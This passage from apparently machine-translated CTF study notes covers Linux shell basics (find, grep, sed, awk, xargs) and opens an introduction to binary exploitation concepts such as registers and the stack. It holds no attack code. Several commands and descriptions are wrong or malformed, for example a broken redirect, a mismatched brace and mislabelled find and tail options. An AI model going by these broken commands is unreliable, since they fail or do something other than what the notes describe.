identification (commonly used is category 1 and category 3)</p> <pre><code>(1), the user can operate the command or executable file\n(2), the core of the system can be called functions and tools, etc.\n(3), some common functions and databases\n(4), the description of the device file\n(5), the format of the settings file or some files\n(6), games\n(7), conventions and protocols, etc. For example, the Linux standard file system, network protocols, ASCII, code and other descriptions of the content\n(8), the system administrator available to manage the order\n(9), and kernel-related files\n</code></pre> <p>As mentioned earlier using whatis will show the specific document category where the command is located, we learn how to use it</p> <pre><code>eg:\n$whatis printf\nprintf (1) - format and print data\nprintf (1p) - write formatted output\nprintf (3) - formatted output conversion\nprintf (3p) - print formatted output\nprintf [builtins] (1) - bash built-in commands, see bash(1)\n</code></pre> <p>We see that printf is available in both category 1 and category 3; the pages in category 1 are for help on command operations and executables; while 3 is for instructions on commonly used libraries; if we want to see the use of printf in C, we can specify to see the help in category 3:</p> <pre><code>$man 3 printf\n\n$man -k keyword\n</code></pre> <p>query keyword Query commands based on some of the keywords in the command, for occasions when only part of the command is remembered.</p> <p>eg: Find GNOME's config tool command:</p> <pre><code>$man -k GNOME config| grep 1\n</code></pre> <p>For a word search, you can use /word directly to use: /-a; pay more attention to SEE ALSO to see more exciting content</p>"},{"location":"CTF/Linux%20Basics/#checking-paths","title":"Checking paths","text":"<p>Check the path to the program's binary file:</p> <pre><code>$which command\n</code></pre> <p>eg: Find the path where the make program is installed:</p> <pre><code>$which make\n/opt/app/openav/soft/bin/make install\n</code></pre> <p>Check the search path of the program:</p> <pre><code>$whereis command\n</code></pre> <p>This command comes in handy when there are multiple versions of the same software installed on the system and you are not sure which version is being used.</p>"},{"location":"CTF/Linux%20Basics/#file-and-directory-management","title":"File and directory management","text":"<p>Directory</p> <ul> <li>File and directory management</li> <li>Create and delete</li> <li>Directory switching</li> <li>List directory entries</li> <li>Find directories and files find/locate</li> <li>View file contents</li> <li>Find the contents of a file</li> <li>Modify file and directory permissions</li> <li>Adding aliases to files</li> <li>Piping and Redirection</li> <li>Set environment variables</li> <li>Bash shortcut input or delete</li> <li>General Application</li> </ul> <p>File management is nothing more than creating, deleting, querying, and moving files or directories, with mkdir/rm/mv</p> <p>file query as the focus, with found for query; find is parameter rich and very powerful.</p> <p>viewing file content is a big topic, and there are too many tools for us to use for text processing, which are just pointed out in this chapter, and a special chapter will be devoted to text processing tools later.</p> <p>Sometimes it is necessary to create an alias for a file, and we need to use ln, using this alias has the same effect as using the original file.</p>"},{"location":"CTF/Linux%20Basics/#create-and-delete","title":"Create and delete","text":"<ul> <li>Create: mkdir</li> <li>Delete: rm</li> <li>Delete non-empty directories: rm -rf file directory</li> <li>Delete log rm log (Equivalent: $find . / -name \"log\" -exec rm {} ;)</li> <li>Move: mv</li> <li>Copy: cp (Copy directory: cp -r )</li> </ul> <p>View the number of files in the current directory:</p> <pre><code>$find . / | wc -l\n</code></pre> <p>Copy the directory:</p> <pre><code>$cp -r source_dir dest_dir\n</code></pre>"},{"location":"CTF/Linux%20Basics/#directory-switching","title":"Directory switching","text":"<ul> <li>Find the file/directory location: cd</li> <li>Switch to the previous working directory: cd -</li> <li>Switch to the home directory: cd or cd ~</li> <li>Show current path: pwd</li> <li>Change the current working path to path: $cd path</li> </ul>"},{"location":"CTF/Linux%20Basics/#list-directory-entries","title":"List directory entries","text":"<ul> <li>Display the files in the current directory ls</li> <li>Show directory entries as a list, sorted by time ls -lrt</li> </ul> <p>The above command is used so often that we need to create a shortcut for it:</p> <p>Set the command alias in .bashrc:</p> <pre><code>alias lsl='ls -lrt'\nalias lm='ls -al|more'\n</code></pre> <p>so that, using lsl, the files in the directory can be displayed sorted by modification time; in a list.</p> <ul> <li>Add an id number to the front of each file (for a neater look):</li> </ul> <pre><code>&gt; ls | cat -n\n</code></pre> <p>&gt; 1 a 2 a.out 3 app 4 b 5 bin 6 config</p> <p>Note: .bashrc is stored as a hidden file under the /home/your username/ folder; you can check it with ls -a.</p>"},{"location":"CTF/Linux%20Basics/#find-directories-and-files-findlocate","title":"Find directories and files find/locate","text":"<p>Search for a file or directory:</p> <pre><code>$find . / -name \"core*\" | xargs file\n</code></pre> <p>Find if there is an obj file in the target folder:</p> <pre><code>$find . / -name '*.o'\n</code></pre> <p>Recursively delete all .o files in the current directory and subdirectories:</p> <pre><code>$find . / -name \"*.o\" -exec rm {} \\;\n</code></pre> <p>find is a real-time lookup, if you need a faster query, try locate; locate will create an index database for the file system, if there are file updates, you need to execute the update command periodically to update the index database:</p> <pre><code>$locate string\n</code></pre> <p>Find paths that contain string:</p> <pre><code>$updatedb\n</code></pre> <p>Unlike find, locate is not a real-time lookup. You need to update the database to get the latest file index information.</p>"},{"location":"CTF/Linux%20Basics/#view-file-contents","title":"View file contents","text":"<p>To view the file: <code>cat vi head tail more</code></p> <p>Display the file with the line number:</p> <pre><code>$cat -n\n</code></pre> <p>Show list contents by page:</p> <pre><code>$ls -al | more\n</code></pre> <p>See only the first 10 lines:</p> <pre><code>$head - 10 **\n</code></pre> <p>Show the first line of the file:</p> <pre><code>$head -1 filename\n</code></pre> <p>Show the penultimate line of the file:</p> <pre><code>$tail -5 filename\n</code></pre> <p>See the difference between the two files:</p> <pre><code>$diff file1 file2\n</code></pre> <p>Dynamically display the latest information in the text:</p> <pre><code>$tail -f crawler.log\n</code></pre>"},{"location":"CTF/Linux%20Basics/#find-the-contents-of-a-file","title":"Find the contents of a file","text":"<p>Use egrep to query the contents of a file:</p> <pre><code>egrep '03.1\\/CO\\/AE' TSF_STAT_111130.log.012\negrep 'A_LMCA777:C' TSF_STAT_111130.log.035 &gt; co.out2\n</code></pre>"},{"location":"CTF/Linux%20Basics/#file-and-directory-permission-modification","title":"File and directory permission modification","text":"<ul> <li>Change the owner of a file chown</li> <li>Change file read, write, execute, etc. attributes chmod</li> <li>Recursive subdirectory modification: chown -R tuxapp source/</li> <li>Add script executable permissions: chmod a+x myscript</li> </ul>"},{"location":"CTF/Linux%20Basics/#add-aliases-to-files","title":"Add aliases to files","text":"<p>Create symbolic/hard links:</p> <pre><code>ln cc ccAgain :hard link; delete one, will still be found.\nln -s cc ccTo :symbolic link (soft link); delete the source, the other will not be available; (the latter ccTo is a newly created file)\n</code></pre>"},{"location":"CTF/Linux%20Basics/#pipelines-and-redirects","title":"Pipelines and Redirects","text":"<ul> <li>Batch command concatenation execution, using |</li> <li>Concatenation: use semicolon ;</li> <li>If the previous one succeeds, the next one is executed, otherwise, it is not executed :&amp;&amp;</li> <li>If the first one fails, the next one is executed: ||</li> </ul> <pre><code>ls /proc &amp;&amp; echo suss! || echo failed.\n</code></pre> <p>The ability to indicate whether the named execution succeeded OR failed.</p> <p>The same effect as above is :</p> <pre><code>if ls /proc; then echo suss; else echo failed; fi\n</code></pre> <p>Redirect:</p> <pre><code>ls proc/*.c &gt; list 2&gt; &amp;l Redirects standard output and standard errors to the same file.\n</code></pre> <p>The equivalent is :</p> <pre><code>ls proc/*.c &amp;&gt; list\n</code></pre> <p>Clear the file:</p> <pre><code>:&gt; a.txt\n</code></pre> <p>Redirect:</p> <pre><code>echo aa &gt;&gt; a.txt\n</code></pre>"},{"location":"CTF/Linux%20Basics/#setting-environment-variables","title":"Setting environment variables","text":"<p>automatically executed after starting the account is the file .profile, through which you can then set your own environment variables.</p> <p>The path of the installed software usually needs to be added to the path:</p> <pre><code>PATH=$APPDIR:/opt/app/soft/bin:$PATH:/usr/local/bin:$TUXDIR/bin:$ORACLE_HOME/bin;export PATH\n</code></pre>"},{"location":"CTF/Linux%20Basics/#bash-shortcut-input-or-delete","title":"Bash shortcut input or delete","text":"<p>Shortcut keys:</p> <pre><code>Ctl-U deletes all characters from the cursor to the beginning of the line, and in some settings, the entire line\nCtl-W deletes the characters between the current cursor and the nearest preceding space\nCtl-H backspace, delete the character in front of the cursor\nCtl-R match the closest file and output\n</code></pre>"},{"location":"CTF/Linux%20Basics/#integrated-applications","title":"Integrated Applications","text":"<p>Find the total number of records in record.log that contain AAA, but not BBB:</p> <pre><code>cat -v record.log | grep AAA | grep -v BBB | wc -l\n</code></pre>"},{"location":"CTF/Linux%20Basics/#text-processing","title":"Text processing","text":"<p>Directory</p> <ul> <li>Text processing</li> <li>find File Find<ul> <li>Customized search</li> <li>Follow-up actions after finding</li> <li>Delimiters for -print</li> </ul> </li> <li>grep text search</li> <li>xargs command line argument conversion</li> <li>sort sorting</li> <li>uniq Eliminate duplicate rows</li> <li>Convert with tr</li> <li>cut slice text by column</li> <li>paste Splice text by column</li> <li>wc Tools for counting rows and characters</li> <li>sed text replacement tool</li> <li>awk data stream processing tool<ul> <li>print prints the current line</li> <li>Special variables: NR NF $0 $1 $2</li> <li>Passing external variables</li> <li>Filtering lines processed by awk with styles</li> <li>Setting delimiters</li> <li>Reading command output</li> <li>Using loops in awk</li> <li>awk combined with grep to find the specified service and kill it</li> <li>awk implements the head and tail commands</li> <li>Print specified columns</li> <li>Print a specified text area</li> <li>Common built-in functions in awk</li> </ul> </li> <li>Iterate over lines, words and characters in a file<ul> <li> <ol> <li>iterate over each line in the file</li> </ol> </li> <li> <ol> <li>iterate over each word in a line</li> </ol> </li> <li> <ol> <li>iterate over each character</li> </ol> </li> </ul> </li> </ul> <p>This section will introduce the most commonly used tools for working with text in the shell under Linux: find, grep, xargs, sort, uniq, tr, cut, paste, wc, sed, awk; the examples and arguments provided are all commonly used; my rule for shell scripts is to write a single line of command, try not to exceed 2 lines; if there are more more complex tasks, consider python.</p>"},{"location":"CTF/Linux%20Basics/#find-file-search","title":"Find file search","text":"<p>find txt and pdf files:</p> <pre><code>find . \\( -name \"*.txt\" -o -name \"*.pdf\" \\) -print\n</code></pre> <p>regular way to find .txt and pdf:</p> <pre><code>find . -regex \". *\\(\\.txt|\\.pdf\\)$\"\n</code></pre> <p>-iregex: ignore case-sensitive regularity</p> <p>Negate arguments , find all non-txt text:</p> <pre><code>find . ! -name \"*.txt\" -print\n</code></pre> <p>Specify the search depth, print out the files in the current directory (depth 1):</p> <pre><code>find . -maxdepth 1 -type f\n</code></pre>"},{"location":"CTF/Linux%20Basics/#custom-search","title":"Custom search","text":"<ul> <li>Search by type</li> </ul> <pre><code>find . -type d -print // list all directories only\n</code></pre> <p>-type f files / l symbolic links / d directories</p> <p>the file search types supported by find can distinguish between ordinary files and symbolic links, directories, etc., but binary and text files cannot be distinguished directly by the types of find</p> <p>The file command can check the specific type of file (binary or text):</p> <pre><code>$file redis-cli # binary file\nredis-cli: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked (uses shared libs), for GNU/Linux 2.6.9, not stripped\n$file redis.pid # Text file\nredis.pid: ASCII text\nredis.pid: ASCII text\n</code></pre> <p>So, you can use the following combination of commands to find all the binary files in your local directory:</p> <pre><code>ls -lrt | awk '{print $9}'|xargs file|grep ELF| awk '{print $1}'|tr -d ':'\n</code></pre> <ul> <li> <p>Search by time</p> <p>-atime access time (in days, or -amin in minutes, similar below) -mtime modification time (content was modified) -ctime change time (metadata or permission changes)</p> </li> </ul> <p>All files that have been accessed in the last 7 days:</p> <pre><code>find . -atime 7 -type f -print\n</code></pre> <p>All files that have been accessed in the last 7 days:</p> <pre><code>find . -atime -7 -type f -print\n</code></pre> <p>Search for all files accessed 7 days ago:</p> <pre><code>find . -atime +7 type f -print\n</code></pre> <ul> <li>Search by size.</li> </ul> <p>w word k M G Find files larger than 2k:</p> <pre><code>find . -type f -size +2k\n</code></pre> <p>Find by permissions:</p> <pre><code>find . -type f -perm 644 -print //find all files with executable permissions\n</code></pre> <p>Find by user:</p> <pre><code>find . -type f -user weber -print// Find files owned by user weber\n</code></pre>"},{"location":"CTF/Linux%20Basics/#follow-up-actions-after-finding","title":"Follow-up actions after finding","text":"<ul> <li>Delete</li> </ul> <p>Delete all swp files in the current directory:</p> <pre><code>find . -type f -name \"*.swp\" -delete\n</code></pre> <p>Another syntax:</p> <pre><code>find . type f -name \"*.swp\" | xargs rm\n</code></pre> <ul> <li>Execute action (powerful exec)</li> </ul> <p>Change the ownership of the current directory to weber:</p> <pre><code>find . -type f -user root -exec chown weber {} \\;\n</code></pre> <p>Note: {} is a special string, and for each matching file, {} is replaced with the corresponding filename.</p> <p>Copy all the files found to another directory:</p> <pre><code>find . -type f -mtime +10 -name \"*.txt\" -exec cp {} OLD \\;\n</code></pre> <ul> <li>Combining multiple commands</li> </ul> <p>If you need to execute multiple commands subsequently, you can write multiple commands as one script. Then just execute the script when -exec is called:</p> <pre><code>-exec . /commands.sh {} \\;\n</code></pre>"},{"location":"CTF/Linux%20Basics/#-prints-delimiter","title":"-print's delimiter","text":"<p>Use '\\n' as the delimiter for the file by default.</p> <p>-print0 uses '\\0' as the file delimiter so that it can search for files containing spaces.</p>"},{"location":"CTF/Linux%20Basics/#grep-text-search","title":"Grep text search","text":"<pre><code>grep match_patten file // default access to matching lines\n</code></pre> <p>Common parameters</p> <p>-o only output matching text lines VS -v only output text lines that do not match</p> <p>-c counts the number of times the file contains text</p> <pre><code>grep -c \"text\" filename\n</code></pre> <p>-n Print matching line numbers</p> <p>-i Ignore case when searching</p> <p>-l prints only the file name</p> <p>Recursive search for text in multi-level directories (a favorite of programmers searching for code):</p> <pre><code>grep \"class\" . -R -n\n</code></pre> <p>Match multiple patterns:</p> <pre><code>grep -e \"class\" -e \"vitural\" file\n</code></pre> <p>grep output file names with a 0 as the ending character (-z):</p> <pre><code>grep \"test\" file* -lZ| xargs -0 rm\n</code></pre> <p>Comprehensive application: find all sql lookups with where conditions in the log:</p> <pre><code>cat LOG.* | tr a-z A-Z | grep \"FROM \" | grep \"WHERE\" &gt; b\n</code></pre> <p>find Chinese example: project directory in utf-8 format and gb2312 format two kinds of files, to find the word is Chinese.</p> <ol> <li> <p>find out its utf-8 encoding and gb2312 encoding are E4B8ADE69687 and D6D0CEC4 respectively</p> </li> <li> <p>query :</p> </li> </ol> <pre><code>   grep: grep -rnP \"\\xE4\\xB8\\xAD\\xE6\\x96\\x87|\\xD6\\xD0\\xCE\\xC4\" * can be\n</code></pre> <p>Chinese character code lookup: http://bm.kdd.cc/</p>"},{"location":"CTF/Linux%20Basics/#xargs-command-line-parameter-conversion","title":"Xargs Command Line Parameter Conversion","text":"<p>xargs is able to convert input data into command line arguments for a specific command; in this way, it can be used in combination with many commands. e.g. grep, e.g. find; - Converting multi-line output to single-line output</p> <p><code>cat file.txt| xargs</code></p> <p>n is a delimiter between multiple lines of text</p> <ul> <li>Convert single line to multi-line output</li> </ul> <pre><code>cat single.txt | xargs -n 3\n</code></pre> <p>-n: specifies the number of fields to display per line</p> <p>Description of xargs parameters</p> <p>-d defines the delimiter (the default is a space. The delimiter for multiple lines is n) -n specifies that the output is multi-line -I {} specifies the replacement string that will be replaced when xargs is expanded, used when the command to be executed requires multiple arguments -0: specify 0 as input delimiter</p> <p>Example:</p> <pre><code>cat file.txt | xargs -I {} . /command.sh -p {} -1\n\n# Count the number of lines in the program\nfind source_dir/ -type f -name \"*.cpp\" -print0 |xargs -0 wc -l\n\n#redis stores data by string and indexes by set, and needs to look up all values by index.\n. /redis-cli smembers $1 | awk '{print $1}'|xargs -I {} . /redis-cli get {}\n</code></pre>"},{"location":"CTF/Linux%20Basics/#sort","title":"Sort","text":"<p>Field Description</p> <p>-n Sort by number VS -d Sort by dictionary order -r Sort in reverse order -k N specifies sorting by column N</p> <p>Example:</p> <pre><code>sort -nrk 1 data.txt\nsort -bd data // ignore leading whitespace characters like spaces\n</code></pre>"},{"location":"CTF/Linux%20Basics/#uniq-eliminate-duplicate-rows","title":"Uniq Eliminate duplicate rows","text":"<ul> <li>Eliminate duplicate rows</li> </ul> <pre><code>sort unsort.txt | uniq\n</code></pre> <ul> <li>Count the number of times each row appears in the file</li> </ul> <pre><code>sort unsort.txt | uniq -c\n</code></pre> <ul> <li>Find duplicate rows</li> </ul> <pre><code>sort unsort.txt | uniq -d\n</code></pre> <p>You can specify the duplicates to be compared in each line: -s start position -w number of characters to compare</p>"},{"location":"CTF/Linux%20Basics/#converting-with-tr","title":"Converting with tr","text":"<ul> <li>General usage</li> </ul> <pre><code>echo 12345 | tr '0-9' '9876543210' // encryption and decryption conversion, replacing the corresponding characters\ncat text| tr '\\t' ' ' //tab to space conversion\n</code></pre> <ul> <li>tr delete characters</li> </ul> <pre><code>cat file | tr -d '0-9' // delete all numbers\n</code></pre> <p>-c find the complement</p> <pre><code>cat file | tr -c '0-9' // Get all the numbers in the file\ncat file | tr -d -c '0-9 \\n' // delete non-numeric data\n</code></pre> <ul> <li>tr compress characters</li> </ul> <p>tr -s compresses repetitive characters in text; most often used to compress extra spaces:</p> <pre><code>cat file | tr -s ' '\n</code></pre> <ul> <li> <p>Character classes</p> </li> <li> <p>Various character classes are available in tr.</p> </li> </ul> <p>alnum: letters and numbers alpha: letters digit: numbers space: blank characters lower: lowercase upper: uppercase cntrl: control (non-printable) characters print: printable characters</p> <p>Usage: tr [:class:] [:class:]</p> <pre><code>tr '[:lower:]' '[:upper:]'\n</code></pre>"},{"location":"CTF/Linux%20Basics/#cut-cut-text-by-column","title":"Cut cut text by column","text":"<ul> <li>Truncate the second and fourth columns of the file</li> </ul> <pre><code>cut -f2,4 filename\n</code></pre> <ul> <li>Remove all columns from the file except column 3</li> </ul> <pre><code>cut -f3 --complement filename\n</code></pre> <p>-d Specify delimiters</p> <pre><code>cat -f2 -d\";\" filename\n</code></pre> <p>-cut The range to take</p> <pre><code>N - Nth field to the end -M 1st field for MN-M N to M fields\n</code></pre> <ul> <li> <p>The unit to be fetched by cut</p> <p>-b in bytes -c in characters -f in fields (using delimiters)</p> </li> </ul> <p>Example:</p> <pre><code>cut -c1-5 file // print first to 5 characters\ncut -c-2 file //Print the first 2 characters\n</code></pre> <p>Truncate columns 5 to 7 of the text</p> <pre><code>$echo string | cut -c5-7\n</code></pre>"},{"location":"CTF/Linux%20Basics/#paste-splice-text-by-column","title":"Paste Splice text by column","text":"<p>Splices two pieces of text together by column;</p> <pre><code>cat file1\n1\n2\n\ncat file2\ncolin\nbook\n\npaste file1 file2\n1 colin\n2 book\n</code></pre> <p>The default delimiter is tab, you can use -d to specify the delimiter:</p> <pre><code>paste file1 file2 -d \",\"\n1,colin\n2,book\n</code></pre>"},{"location":"CTF/Linux%20Basics/#wc-tools-for-counting-lines-and-characters","title":"Wc Tools for counting lines and characters","text":"<pre><code>$wc -l file // count the number of lines\n\n$wc -w file // count the number of words\n\n$wc -c file // count the number of characters\n</code></pre>"},{"location":"CTF/Linux%20Basics/#sed-text-replacement-tool","title":"Sed text replacement tool","text":"<ul> <li>First substitution</li> </ul> <pre><code>sed 's/text/replace_text/' file // Replace the first matching text on each line\n</code></pre> <ul> <li>Global replacement</li> </ul> <pre><code>sed 's/text/replace_text/g' file\n</code></pre> <p>Default replace, output the replaced content, if you need to replace the original file directly, use -i:</p> <pre><code>sed -i 's/text/repalce_text/g' file\n</code></pre> <ul> <li>Remove blank lines</li> </ul> <pre><code>sed '/^$/d' file\n</code></pre> <ul> <li>Variable conversion</li> </ul> <p>Matched strings are referenced by the &amp; marker.</p> <pre><code>echo this is en example | sed 's/\\w+/[&amp;]/g'\n$&gt;[this] [is] [en] [example]\n</code></pre> <ul> <li>Substring matching tokens</li> </ul> <p>The contents of the first matching bracket are referenced using token 1</p> <pre><code>sed 's/hello\\([0-9]\\)/\\1/'\n</code></pre> <ul> <li>Double quotes for values</li> </ul> <p>sed is usually quoted in single quotes; double quotes can also be used, and when used, double quotes will evaluate the expression:</p> <pre><code>sed 's/$var/HLLOE/'\n</code></pre> <p>when using double quotes, we can specify variables in sed style and in replacement strings.</p> <pre><code>eg:\np=patten\nr=replaced\necho \"line con a patten\" | sed \"s/$p/$r/g\"\n$&gt;line con a replaced\n</code></pre> <ul> <li>Other examples</li> </ul> <p>String insertion character: converts each line of text (ABCDEF) to ABC/DEF:</p> <pre><code>sed 's/^. \\{3\\}/&amp;\\/g' file\n</code></pre>"},{"location":"CTF/Linux%20Basics/#awk-data-stream-processing-tool","title":"Awk data stream processing tool","text":"<ul> <li>The awk script structure</li> </ul> <pre><code>awk ' BEGIN{ statements } statements2 END{ statements } '\n</code></pre> <ul> <li> <p>How it works</p> </li> <li> <p>executing the block of statements in begin.</p> </li> <li> <p>reads a line from the file or stdin and executes statements2, repeating the process until the file has been read in its entirety.</p> </li> <li> <p>Execute the end statement block.</p> </li> </ul>"},{"location":"CTF/Linux%20Basics/#print-prints-the-current-line","title":"print prints the current line","text":"<ul> <li>When using print without arguments, the current line is printed</li> </ul> <pre><code>echo -e \"line1\\nline2\" | awk 'BEGIN{print \"start\"} {print } END{ print \"End\" }'\n</code></pre> <ul> <li>print When split by commas, arguments are delimited by spaces;</li> </ul> <pre><code>echo | awk ' {var1 = \"v1\" ; var2 = \"V2\"; var3 = \"v3\"; \\\nprint var1, var2 , var3; }'\n$&gt;v1 V2 v3\n</code></pre> <ul> <li>Using the -splicer approach (\"\" as a splice character) ;</li> </ul> <pre><code>echo | awk ' {var1 = \"v1\" ; var2 = \"V2\"; var3 = \"v3\"; \\\nprint var1\"-\"var2\"-\"var3; }'\n$&gt;v1-V2-v3\n</code></pre>"},{"location":"CTF/Linux%20Basics/#special-variables-nr-nf-0-1-2","title":"Special variables: NR NF $0 $1 $2","text":"<p>NR:indicates the number of records, corresponding to the line number that should precede it during execution.</p> <p>NF:indicates the number of fields, which always pairs up with the number of fields that should go forward during execution.</p> <p>$0:this variable contains the text content of the current line during execution.</p> <p>$1:the text content of the first field.</p> <p>$2:the text content of the second field.</p> <pre><code>echo -e \"line1 f2 f3 \\n line2 \\n line 3\" | awk '{print NR\":\"$0\"-\"$1\"-\"$2}'\n</code></pre> <ul> <li>Print the second and third fields of each line</li> </ul> <pre><code>awk '{print $2, $3}' file\n</code></pre> <ul> <li>Count the number of lines in the file</li> </ul> <pre><code>awk ' END {print NR}' file\n</code></pre> <ul> <li>Accumulate the first field of each line</li> </ul> <pre><code>echo -e \"1\\n 2\\n 3\\n 4\\n\" | awk 'BEGIN{num = 0 ;\nprint \"begin\";} {sum += $1;} END {print \"==\"; print sum }'\n</code></pre>"},{"location":"CTF/Linux%20Basics/#passing-external-variables","title":"Passing external variables","text":"<pre><code>var=1000\necho | awk '{print vara}' vara=$var # Input from stdin\nawk '{print vara}' vara=$var file # Input from file\n</code></pre>"},{"location":"CTF/Linux%20Basics/#filter-the-lines-processed-by-awk-with-the-style","title":"Filter the lines processed by awk with the style","text":"<pre><code>awk 'NR &lt; 5' # line number less than 5\nawk 'NR == 1,NR == 4 {print}' file # Print out line numbers equal to 1 and 4\nawk '/linux/' # lines containing linux text (can be specified with regular expressions, super powerful)\nawk '! /linux/' # lines that do not contain linux text\n</code></pre>"},{"location":"CTF/Linux%20Basics/#set-delimiters","title":"Set delimiters","text":"<p>Use -F to set delimiters (default is spaces):</p> <pre><code>awk -F: '{print $NF}' /etc/passwd\n</code></pre>"},{"location":"CTF/Linux%20Basics/#read-command-output","title":"Read command output","text":"<p>Use getline to read the output of an external shell command into the variable cmdout:</p> <pre><code>echo | awk '{\"grep root /etc/passwd\" | getline cmdout; print cmdout }'\n</code></pre>"},{"location":"CTF/Linux%20Basics/#using-loops-in-awk","title":"Using loops in awk","text":"<pre><code>for(i=0;i&lt;10;i++){print $i;}\nfor(i in array){print array[i];}\n</code></pre> <p>eg:The following string, print out the time string:</p> <pre><code>2015_04_02 20:20:08: mysqli connect failed, please check connect info\n$echo '2015_04_02 20:20:08: mysqli connect failed, please check connect info'|awk -F \":\" '{ for(i=1;i&lt;=;i++) printf(\"%s:\",$i)}'\n&gt;2015_04_02 20:20:08: # This way will print the last colon\n$echo '2015_04_02 20:20:08: mysqli connect failed, please check connect info'|awk -F':' '{print $1 \":\" $2 \":\" $3; }'\n&gt;2015_04_02 20:20:08 # This way satisfies the requirement\n</code></pre> <p>And if you need to print out the later part as well (the time part is printed separately from the later text) :</p> <pre><code>$echo '2015_04_02 20:20:08: mysqli connect failed, please check connect info'|awk -F':' '{print $1 \":\" $2 \":\" $3; print $4;}'\n&gt;2015_04_02 20:20:08\n&gt;mysqli connect failed, please check connect info\n</code></pre> <p>Print the rows in reverse order: (implementation of the tac command):</p> <pre><code>seq 9| \\\nawk '{lifo[NR] = $0; lno=NR} \\\nEND{ for(;lno&gt;-1;lno--){print lifo[lno];}\n} '\n</code></pre>"},{"location":"CTF/Linux%20Basics/#awk-combined-with-grep-finds-the-specified-service-and-kills-it","title":"awk combined with grep finds the specified service and kills it","text":"<pre><code>ps -fe| grep msv8 | grep -v MFORWARD | awk '{print $2}' | xargs kill -9;\n</code></pre>"},{"location":"CTF/Linux%20Basics/#awk-implementation-of-head-and-tail-commands","title":"awk implementation of head and tail commands","text":"<ul> <li>head</li> </ul> <pre><code>awk 'NR&lt;=10{print}' filename\n</code></pre> <ul> <li>tail</li> </ul> <pre><code>awk '{buffer[NR%10] = $0;} END{for(i=0;i&lt;11;i++){ \\\nprint buffer[i %10]} } ' filename\n</code></pre>"},{"location":"CTF/Linux%20Basics/#print-the-specified-column","title":"Print the specified column","text":"<ul> <li>awk way to implement</li> </ul> <pre><code>ls -lrt | awk '{print $6}'\n</code></pre> <ul> <li>The cut method</li> </ul> <pre><code>ls -lrt | cut -f6\n</code></pre>"},{"location":"CTF/Linux%20Basics/#print-the-specified-text-area","title":"Print the specified text area","text":"<ul> <li>Determine the line number</li> </ul> <pre><code>seq 100| awk 'NR==4,NR==6{print}'\n</code></pre> <ul> <li>Determine the text</li> </ul> <p>Print the text between start_pattern and end_pattern:</p> <pre><code>awk '/start_pattern/, /end_pattern/' filename\n</code></pre> <p>Example:</p> <pre><code>seq 100 | awk '/13/,/15/'\ncat /etc/passwd| awk '/mai.*mail/,/news.*news/'\n</code></pre>"},{"location":"CTF/Linux%20Basics/#awk-common-built-in-functions","title":"awk common built-in functions","text":"<p>index(string,search_string):return the position of search_string in string</p> <p>sub(regex,replacement_str,string):replace the first regular match with replacement_str;</p> <p>match(regex,string):check if the regular expression can match the string.</p> <p>length(string):return the length of the string</p> <pre><code>echo | awk '{\"grep root /etc/passwd\" | getline cmdout; print length(cmdout) }'\n</code></pre> <p>printf is similar to printf in c, and formats the output:</p> <pre><code>seq 10 | awk '{printf \"-&gt;%4s\\n\", $1}'\n</code></pre>"},{"location":"CTF/Linux%20Basics/#iterate-over-lines-words-and-characters-in-a-file","title":"Iterate over lines, words and characters in a file","text":""},{"location":"CTF/Linux%20Basics/#iterate-over-each-line-in-the-file","title":"Iterate over each line in the file","text":"<ul> <li>while loop method</li> </ul> <pre><code>while read line;\ndo\necho $line;\ndone &lt; file.txt\n\nChange to a subshell:\ncat file.txt | (while read line;do echo $line;done)\n</code></pre> <ul> <li>awk method</li> </ul> <pre><code>cat file.txt| awk '{print}'\n</code></pre>"},{"location":"CTF/Linux%20Basics/#iterate-over-each-word-in-a-line","title":"Iterate over each word in a line","text":"<pre><code>for word in $line;\ndo\necho $word;\ndone\n</code></pre>"},{"location":"CTF/Linux%20Basics/#iterate-over-each-character","title":"Iterate over each character","text":"<p>${string:start_pos:num_of_chars}: extract a character from the string; (bash text slicing)</p> <p>${#word}:return the length of the variable word</p> <pre><code>for((i=0;i&lt;${#word};i++))\ndo\necho ${word:i:1);\ndone\n</code></pre> <p>Display the file in ASCII characters:</p> <pre><code>$od -c filename\n</code></pre>"},{"location":"CTF/PWN/","title":"Binary Exploitation","text":"<p>https://ctf101.org/binary-exploitation/overview/</p> <p>Binaries, or executables, are machine codes for a computer to execute. For the most part, the binaries that you will face in CTFs are Linux ELF files or the occasional Windows executable. Binary Exploitation is a broad topic within Cyber Security that really comes down to finding a vulnerability in the program and exploiting it to gain control of a shell or modifying the program's functions.</p> <p>Common topics addressed by Binary Exploitation or 'pwn' challenges include:</p> <ul> <li>Registers</li> <li>The Stack</li> <li>Calling Conventions</li> <li>Global Offset Table (GOT)</li> <li>Buffers</li> <li>Buffer Overflow</li> <li>Return Oriented Programming (ROP)</li> <li>Binary Security</li> <li>No eXecute (NX)</li> <li>Address Space Layout Randomization (ASLR)</li> <li>Stack Canaries</li> <li>Relocation Read-Only (RELRO)</li> <li>The Heap</li> <li>Heap Exploitation</li> <li>Format String Vulnerability</li> </ul>"},{"location":"CTF/PWN/#registers","title":"Registers","text":"<p>A register is a location within the processor that is able to store data, much like RAM. Unlike RAM, however, accesses to registers are effectively instantaneous, whereas reads from main memory can take hundreds of CPU cycles to return.</p> <p>Registers can hold any value: addresses (pointers), results from mathematical operations, characters, etc. Some registers are reserved however, meaning they have a special purpose and are not \"general purpose registers\" (GPRs). On x86, the only 2 reserved registers are <code>rip</code> and <code>rsp</code> which hold the address of the next instruction to execute and the address of the stack respectively.</p> <p>On x86, the same register can have different-sized accesses for backward compatibility. For example, the <code>rax</code> register is the full 64-bit register, <code>eax</code> is the low 32 bits of <code>rax</code>, <code>ax</code> is the low 16 bits, <code>al</code> is the low 8 bits, and <code>ah</code> is the high 8 bits of <code>ax</code> (bits 8-16 of <code>rax</code>).</p>"},{"location":"CTF/PWN/#the-stack","title":"The Stack","text":"<p>In computer architecture, the stack is a hardware manifestation of the stack data structure (a Last In, First Out queue).</p> <p>In x86, the stack is simply an area in RAM that was chosen to be the stack - there is no special hardware to store stack contents. The <code>esp</code>/<code>rsp</code> register holds the address in memory where the bottom of the stack resides. When something is <code>push</code>ed to the stack, <code>esp</code> decrements by 4 (or 8 on 64-bit x86), and the value that was <code>push</code>ed is stored at that location in memory. Likewise, when a <code>pop</code> instruction is executed, the value at <code>esp</code> is retrieved (i.e. <code>esp</code> is dereferenced), and <code>esp</code> is then incremented by 4 (or 8).</p> <p>N.B. The stack \"grows\" down to lower memory addresses!</p> <p>Conventionally, <code>ebp</code>/<code>rbp</code> contains the address of the top of the current stack frame, and so sometimes local variables are referenced as an 